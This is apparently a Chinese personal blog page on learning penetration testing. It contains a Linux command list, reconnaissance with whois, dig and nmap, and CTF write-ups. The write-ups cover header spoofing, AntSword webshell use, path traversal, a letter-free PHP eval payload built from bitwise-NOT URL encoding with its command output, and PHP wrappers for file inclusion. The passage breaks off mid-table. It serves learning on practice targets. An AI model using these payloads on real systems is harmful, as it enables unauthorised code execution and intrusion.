class="line">ssh-keygen -t rsa                                            //生成SSH密钥对，用于身份验证远程服务器</span><br><span class="line">date                                                         //显示或设置系统日期和时间</span><br><span class="line">echo                                                         //将文本输出到标准输出</span><br><span class="line">ln source_file link_name                                     //创建硬链接</span><br><span class="line">ln -s source_file link_name                                  //创建符号链接</span><br><span class="line">uname -a                                                     //显示系统信息</span><br><span class="line">shutdown/reboot                                              //关闭或重新启动系统</span><br><span class="line">who/w                                                        //显示当前登录的用户信息</span><br><span class="line">curl -X GET http://exampe.com                                //用于与网络资源进行交互，支持各种协议</span><br><span class="line">zip archive.zip file1 file2                                  //压缩文件</span><br><span class="line">unzip archive.zip                                            //解压ZIP文件</span><br><span class="line">chmod permissions file_name                                  //修改文件权限</span><br><span class="line">chown owner:group file_name                                  //修改文件所有者</span><br><span class="line">useradd new_user                                             //添加用户</span><br><span class="line">userdel username                                             //删除用户</span><br><span class="line">passwd                                                       //更改用户密码</span><br><span class="line">crontab -e                                                   //编辑用户的定时任务</span><br><span class="line">uptime                                                       //显示系统的运行时间和负载情况</span><br><span class="line">hostname                                                     //显示或设置计算机的主机名</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT                //允许HTTP流量(用于配置防火墙规则)</span><br><span class="line">ufw enable                                                   //启用Uncomplicated Firewall(用于配置防火墙规则)</span><br><span class="line">netstat -tuln                                                //显示所有TCP和UDP端口</span><br><span class="line">ss -tuln                                                     //使用Socket Stat查看网络连接</span><br><span class="line">ps aux                                                       //显示所有进程</span><br><span class="line">top                                                          //实时监视系统资源</span><br><span class="line">htop                                                         //更友好的进程监视器</span><br><span class="line">history                                                      //查看命令历史记录</span><br><span class="line">free -m                                                      //以MB为单位显示内存使用情况</span><br><span class="line">lsblk                                                        //显示块设备信息</span><br><span class="line">fdisk /dev/sdX                                               //打开磁盘分区工具</span><br><span class="line">nc -vz host_name_or_ip port                                  //测试主机的端口是否可达</span><br><span class="line">stat file_or_directory                                       //显示文件或目录的详细信息</span><br><span class="line">nmcli connection show                                        //显示网络连接信息</span><br><span class="line">tailf file_name                                              //实时追踪文件的末尾，类似于tail -f</span><br><span class="line">scp local_file remote_user@remote_host:/remote/directory     //从本地到远程</span><br><span class="line">scp remote_user@remote_host:/remote/file local_directory     //从远程到本地</span><br><span class="line">rsync                                                        //用于在本地和远程系统之间同步文件和目录</span><br><span class="line">例：rsync -avz source_directory/ remote_user@remote_host:/remote/directory/</span><br><span class="line">dd if=input_file of=output_file bs=block_size                //用于复制和转换文件</span><br><span class="line">sudo                                                         //以超级用户权限运行命令</span><br></pre></td></tr></table></figure>



<h4 id="kali-linux进行渗透测试"><a href="#kali-linux进行渗透测试" class="headerlink" title="kali linux进行渗透测试"></a>kali linux进行渗透测试</h4><h5 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h5><h6 id="信息收集（Reconnaissance）"><a href="#信息收集（Reconnaissance）" class="headerlink" title="信息收集（Reconnaissance）"></a>信息收集（Reconnaissance）</h6><p>使用Whois查询域名信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure>

<p>WHOIS 查询能获取哪些信息:</p>
<p>查询返回的信息会因顶级域名和注册商的不同而有所差异，但通常包含以下内容：</p>
<ol>
<li><strong>域名状态：</strong> 如 <code>ok</code> (正常), <code>clientHold</code> (注册商暂停解析), <code>serverHold</code> (注册局暂停解析), <code>pendingDelete</code> (等待删除) 等。这反映了域名的当前管理状态。</li>
<li><strong>注册人信息：</strong><ul>
<li>注册人姓名&#x2F;组织名称。</li>
<li>注册人联系地址。</li>
<li>注册人联系电话。</li>
<li>注册人联系邮箱。</li>
<li><strong>(重要变化)</strong> 由于隐私法规（如 GDPR），现在公开显示的注册人信息通常是<strong>注册商提供的隐私保护服务</strong>的联系信息，而不是真实的注册人信息。</li>
</ul>
</li>
<li><strong>管理联系人信息：</strong> 负责管理域名事宜的联系人信息（同样常受隐私保护）。</li>
<li><strong>技术联系人信息：</strong> 负责处理域名技术问题（如 DNS）的联系人信息（同样常受隐私保护）。</li>
<li><strong>注册商信息：</strong><ul>
<li>注册商名称。</li>
<li>注册商官方网站。</li>
<li>注册商 WHOIS 服务器地址。</li>
<li>注册商提供的支持联系方式。</li>
</ul>
</li>
<li><strong>重要日期：</strong><ul>
<li><strong>创建日期：</strong> 域名首次注册的日期。</li>
<li><strong>到期日期：</strong> 域名注册的有效截止日期。在此日期后未续费，域名可能会被删除并重新开放注册。</li>
<li><strong>更新日期：</strong> 域名信息（如联系信息或 DNS 设置）最后一次更新的日期。</li>
</ul>
</li>
<li><strong>域名服务器：</strong><ul>
<li>主域名服务器地址。</li>
<li>辅域名服务器地址。这些服务器存储了该域名对应的 DNS 记录（如 A, MX, CNAME 记录）。</li>
</ul>
</li>
<li><strong>授权服务器：</strong> 有时会列出提供该域名权威 WHOIS 数据的服务器地址。</li>
</ol>
<p>使用Dig进行DNS查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig [@server] [options] [name] [type]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>[@server]</code> (可选):</strong> 指定要查询的 DNS 服务器的 IP 地址或主机名。如果省略，则使用系统 <code>/etc/resolv.conf</code> 文件中配置的 DNS 服务器。<ul>
<li>示例：<code>dig @8.8.8.8 example.com</code></li>
</ul>
</li>
<li><strong><code>[options]</code> (可选):</strong> 控制 <code>dig</code> 行为和输出的各种选项，以 <code>+</code> 开头。<ul>
<li>常用选项：<ul>
<li><code>+short</code>: 只显示最精简的答案（通常是 IP 地址或目标域名）。</li>
<li><code>+noall</code>: 关闭所有输出部分（通常与 <code>+answer</code> 等组合使用）。</li>
<li><code>+answer</code>: <strong>只显示答案部分</strong> (最常用！)。</li>
<li><code>+stats</code>: 显示查询统计信息（耗时、大小等）。</li>
<li><code>+trace</code>: 模拟 DNS 递归解析的完整过程，从根域名服务器开始追踪。</li>
<li><code>+nocmd</code>: 不显示最初的命令和版本信息行。</li>
<li><code>+nocomments</code>: 不显示注释行。</li>
<li><code>+tcp</code>: 强制使用 TCP 协议进行查询（默认使用 UDP，在响应过大或需要区域传输时 TCP 是必需的）。</li>
<li><code>-x</code>: 进行反向 DNS 查询（根据 IP 查找域名），此时 <code>[name]</code> 应为 IP 地址，<code>[type]</code> 通常省略或为 <code>PTR</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>[name]</code> (通常需要):</strong> 要查询的域名（如 <code>example.com</code>, <code>www.google.com</code>) 或 IP 地址（当使用 <code>-x</code> 时）。</li>
<li><strong><code>[type]</code> (可选):</strong> 指定要查询的 DNS 记录类型。如果省略，默认为查询 <code>A</code> 记录。常见类型：<code>A</code>, <code>AAAA</code>, <code>MX</code>, <code>CNAME</code>, <code>NS</code>, <code>TXT</code>, <code>SOA</code>, <code>PTR</code>, <code>ANY</code>（查询所有记录，但通常被服务器限制或拒绝）。<ul>
<li>示例：<code>dig example.com MX</code>, <code>dig example.com NS</code></li>
</ul>
</li>
</ul>
<p><code>dig</code> 是 DNS 领域无可争议的瑞士军刀。它通过提供<strong>详细、可控、原始</strong>的 DNS 查询响应，使你能够：</p>
<ul>
<li>精确查询<strong>任何类型</strong>的 DNS 记录。</li>
<li>指定向<strong>任何 DNS 服务器</strong>发送查询。</li>
<li><strong>深入诊断</strong>各种 DNS 解析问题。</li>
<li><strong>验证</strong> DNS 配置更改。</li>
<li><strong>理解</strong> DNS 协议交互的底层细节。</li>
</ul>
<p>Nmap的使用</p>
<h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a><strong>核心功能</strong></h3><ol>
<li><strong>端口扫描</strong><ul>
<li><code>-sS</code>：TCP SYN 扫描（默认，需 root）</li>
<li><code>-sT</code>：TCP 全连接扫描（无需 root）</li>
<li><code>-sU</code>：UDP 扫描（需 sudo）</li>
<li><code>-p</code>：指定端口（<code>-p 80,443</code> 或 <code>-p-</code> 全端口）</li>
</ul>
</li>
<li><strong>服务识别</strong><ul>
<li><code>-sV</code>：探测服务版本</li>
</ul>
</li>
<li><strong>操作系统探测</strong><ul>
<li><code>-O</code>：猜测目标 OS</li>
</ul>
</li>
<li><strong>主机发现</strong><ul>
<li><code>-sn</code>：Ping 扫描（不扫端口）</li>
</ul>
</li>
<li><strong>脚本引擎（NSE）</strong><ul>
<li><code>--script=&lt;脚本&gt;</code>：如 <code>vuln</code>（漏洞检测）、<code>http-title</code>（网页标题</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描：SYN + 服务版本</span><br><span class="line">sudo nmap -sS -sV target_ip</span><br><span class="line"></span><br><span class="line"># 快速扫描：仅常用端口</span><br><span class="line">nmap -F target_ip</span><br><span class="line"></span><br><span class="line"># 全端口扫描 + OS 探测</span><br><span class="line">sudo nmap -p- -O target_ip</span><br><span class="line"></span><br><span class="line"># UDP 关键端口扫描</span><br><span class="line">sudo nmap -sU -p 53,67,161 target_ip</span><br><span class="line"></span><br><span class="line"># 漏洞检测（NSE）</span><br><span class="line">sudo nmap --script=vuln target_ip</span><br></pre></td></tr></table></figure>

<p>感觉这样只学理论感觉不太行，以后的边练边学。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>moectf2025</p>
<h3 id="第一章-神秘的手镯"><a href="#第一章-神秘的手镯" class="headerlink" title="第一章 神秘的手镯"></a>第一章 神秘的手镯</h3><p>F12在源码中找到flag</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A01.png" alt="1"></p>
<h3 id="第三章-问剑石！篡天改命！"><a href="#第三章-问剑石！篡天改命！" class="headerlink" title="第三章 问剑石！篡天改命！"></a>第三章 问剑石！篡天改命！</h3><p>F12查看源码看到flag的逻辑</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testTalent</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=B&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;none&#x27;</span> &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">textContent</span> = data.<span class="property">result</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 显示/隐藏光芒效果</span></span><br><span class="line">            <span class="keyword">const</span> glow = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;glow&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">result</span>.<span class="title function_">includes</span>(<span class="string">&#x27;流云状青芒&#x27;</span>)) &#123;</span><br><span class="line">                glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨\n\n天赋篡天术大成！`</span>);</span><br><span class="line">                &#125;, <span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;玄轨连接中断！请检查灵枢...&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以通过在控制台发送信息来得到flag</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=S&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;flowing_azure_clouds&#x27;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;篡改成功！Flag为：&quot;</span>, data.<span class="property">flag</span>);</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨`</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;篡天失败：&quot;</span>, err));</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A03.png" alt="1"></p>
<h3 id="第十二章-玉魄玄关·破妄"><a href="#第十二章-玉魄玄关·破妄" class="headerlink" title="第十二章 玉魄玄关·破妄"></a>第十二章 玉魄玄关·破妄</h3><p>用蚁剑，先右键添加数据，输入ip和端口，测试链接，再点击添加就成功了，密码是cmd</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A012.1.png" alt="1"></p>
<p>flag应该就藏在某个文件夹里面，反正我没找到，以后再看看。找到了在环境变量里面。</p>
<h3 id="第五章-打上门来！"><a href="#第五章-打上门来！" class="headerlink" title="第五章 打上门来！"></a>第五章 打上门来！</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../</span><br></pre></td></tr></table></figure>

<p>..&#x2F;可以返回上级目录</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/5.1.png" alt="1"></p>
<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.1.png" alt="1"></p>
<p>用F12查看到Secret.php</p>
<p>访问Secret.php</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.2.png" alt="1"></p>
<p>用bp</p>
<p>header中添加上 <code>Referer:https://www.Sycsecret.com</code></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.4.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.3.png" alt="1"></p>
<p>修改 User-Agent 为<code>User-Agent: Syclover</code></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.5.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.6.png" alt="1"></p>
<p>127.0.0.1,所以我们可以利用<code>X-Forwarded-For</code>协议来伪造只需要在 header 添加 <code>X-Forwarded-For:127.0.0.1</code>，再次访问</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.7.png" alt="1"></p>
<h3 id="NSSCTF-hardrce"><a href="#NSSCTF-hardrce" class="headerlink" title="NSSCTF hardrce"></a>NSSCTF hardrce</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];<span class="comment">//对wllm内容进行限制，过滤掉一下的特殊字符</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>)) <span class="comment">//进行正则匹配，过滤掉大小写字母</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>); <span class="comment">//执行wllm，说明存在远程代码执行漏洞</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jyshare.com/compile/11/">php在线运行网站</a></p>
<p>取反符号 ‘ ~ ‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;ls /&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%8C%86%8C%8B%9A%92</span><br><span class="line">%93%8C%DF%D0</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%8C%86%8C%8B%9A%92</span><br><span class="line">%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？NSSCTF&#123;<span class="number">47638</span>a22-<span class="number">222</span>b-<span class="number">4171</span>-a5bd-<span class="number">890458</span>f414a7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="第十六章-昆仑星途"><a href="#第十六章-昆仑星途" class="headerlink" title="第十六章 昆仑星途"></a>第十六章 昆仑星途</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>文件包含漏洞</p>
<p>使用 PHP 封装器</p>
<table>
<thead>
<tr>
<th>Wrapper</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>php://input</code></td>
<td>读取 POST 数据，可执行代码</td>
</tr>
<tr>
<td><code>php://filter</code></td>
<td>数据流过滤，用于读取文件源码</td>
</tr>
<tr>
<td><code>php://memory</code> &#x2F; <code>php://temp</code></td>
<td>内存数据流</td>
</tr>
<tr>
<td><code>data://</code></td>
<td>数据 URI，可嵌入代码</td>
</tr>
<tr>
